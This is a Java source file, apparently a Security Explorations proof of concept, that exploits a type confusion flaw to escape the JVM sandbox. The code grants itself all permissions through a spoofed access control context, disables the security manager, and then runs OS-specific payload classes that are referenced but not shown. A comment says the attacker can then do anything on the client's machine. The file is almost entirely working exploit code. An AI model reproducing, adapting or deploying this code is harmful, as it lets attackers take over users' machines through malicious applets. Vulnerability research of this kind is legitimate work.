

/* exploit for full JVM sandbox bypass                                        */
/* vulnerability condition: 1) arbitrary type confusion condition             */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.io.*;
import java.security.*;

public class Exploit 
{  
  public static void EvilMethod() 
  {
   try 
   {
    String sysname=System.getProperty("os.name").toLowerCase();
    if (sysname.startsWith("windows")) 
    {
     Windows obj = new Windows();
    }
    else if (sysname.startsWith("mac"))
    {
      OSX obj = new OSX();
    }
    /* ASSUME DEBIAN LINUX */
    else
    {
      Debian obj = new Debian();
    }
   } 
   
   catch (Throwable e) {e.printStackTrace();}
  }

  public static void run() {
   try 
   {
     Dummy2 d2=MaliciousApplet.d2;
     /* access Helper class instance as if it was of SpoofedHelper class    */
     SpoofedHelper sh=d2.sh2;
     /* mark current AccessControlContext as a privileged one               */
     MyAccessControlContext macc=sh.acc;
     MyProtectionDomain mpd=macc.context[0];
     MyPermissions permissions=mpd.permissions;
     permissions.allPermission=(PermissionCollection)permissions;

     /* set "security" field of java.lang.System class to null              */
     System.setSecurityManager(null);

     /* from now on we can do whatever we want on the client's machine      */
     EvilMethod();
   } catch(Throwable e) {e.printStackTrace();}
  }

}
